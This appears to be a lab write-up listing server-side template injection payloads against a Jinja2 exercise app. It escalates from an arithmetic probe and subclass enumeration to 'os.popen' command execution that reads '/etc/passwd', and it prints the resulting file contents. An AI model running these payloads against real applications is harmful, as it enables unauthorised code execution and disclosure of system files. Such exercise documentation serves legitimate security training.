# Payloads

All payloads below were submitted through the "Enter your input" field
of the Template Injection App and rendered via the "Render" button.
The application echoes the input inside a Jinja2 template without
sanitization, allowing injected template syntax to be evaluated
server-side.

## Payload 1 — Confirming SSTI (arithmetic test)

```
{{5*5}}
```

**Purpose:** basic sanity check to confirm the input is evaluated as
Jinja2 code rather than displayed as plain text.

**Result (confirmed):** the page rendered `25` instead of the literal
string `5*5`, confirming the presence of SSTI and that the engine in
use is **Jinja2**.

## Payload 2 — Enumerating the Python object hierarchy (reconnaissance)

```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

**Purpose:** list every subclass currently loaded in the Python
process, in order to locate a class that provides access to
dangerous functionality (e.g. `subprocess.Popen`, file I/O, etc.).

**Result (confirmed):** returned a very large list of loaded classes,
including `subprocess.Popen`, `os._wrap_close`, and various
`jinja2.*` / `werkzeug.*` internals — confirming no sandboxing is in
place and the full Python object graph is reachable from the
template context.

## Payload 3 — Achieving code execution and reading `/etc/passwd` (confirmed working)

This is the payload that successfully achieved the exercise's
objective.

```
{{ cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
```

**How it works:**
- `cycler` is a Jinja2 built-in global, always present in the
  template's rendering context regardless of what the application
  passes in.
- `cycler.__init__.__globals__` exposes the global namespace of the
  Python module that defines `cycler` (`jinja2/utils.py`), which
  itself imports the `os` module.
- `os.popen('cat /etc/passwd').read()` then executes the shell
  command `cat /etc/passwd` and returns its full output as a string,
  which gets rendered directly into the page.

**Result (confirmed):**

```
Hello, { root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin }!
```

The exploit achieved the exercise's exact goal: the full contents of
`/etc/passwd` displayed on the page, **without modifying the
application or its source code** — purely through the exposed input
field.

## Payload 4 — Alternative global entry points (not required, documented as alternates)

If `cycler` were unavailable for any reason, the same technique works
through other Jinja2 built-in globals that also expose Python module
globals:

```
{{ joiner.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
```

```
{{ lipsum.__globals__.os.popen('cat /etc/passwd').read() }}
```

Both rely on the exact same principle: a Jinja2 built-in global object
whose `__globals__`/`__init__.__globals__` dictionary includes the
`os` module, reached without needing to walk the full
`__subclasses__()` list from Payload 2.
